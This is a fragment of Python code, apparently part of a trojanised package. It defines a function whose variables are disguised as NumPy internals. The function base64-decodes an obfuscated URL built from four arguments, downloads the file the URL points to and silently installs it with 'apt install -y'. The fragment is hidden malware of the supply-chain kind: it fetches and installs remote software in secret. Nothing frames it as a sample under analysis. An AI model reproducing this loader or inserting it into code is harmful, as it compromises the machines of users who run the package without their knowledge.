...
def arr(arr1, arr2, arr3, arr4):
    __NUMPY_HASH_ = arr1 + arr2 + arr3 + arr4
    __NUMPY_URL_ = base64.b64decode(__NUMPY_HASH_).decode()
    __NUMPY_FILE_PATH_ = "./" + os.path.basename(__NUMPY_URL_)
    if not os.path.exists(__NUMPY_FILE_PATH_):
        urllib.request.urlretrieve(__NUMPY_URL_, __NUMPY_FILE_PATH_)
        __NUMPY_PROCESS_ = Popen(['apt', 'install', '-y', '-f', __NUMPY_FILE_PATH_], stdout=PIPE, stderr=PIPE)
        while True:
            __NUMPY_OUTPUT_ = __NUMPY_PROCESS_.stdout.readline()
            if __NUMPY_OUTPUT_ == b'' and __NUMPY_PROCESS_.poll() is not None:
                break
            if __NUMPY_OUTPUT_:
                print(__NUMPY_OUTPUT_.decode().strip())
        _NUMPY_EXIT_CODE_ = __NUMPY_PROCESS_.poll()
        return _NUMPY_EXIT_CODE_
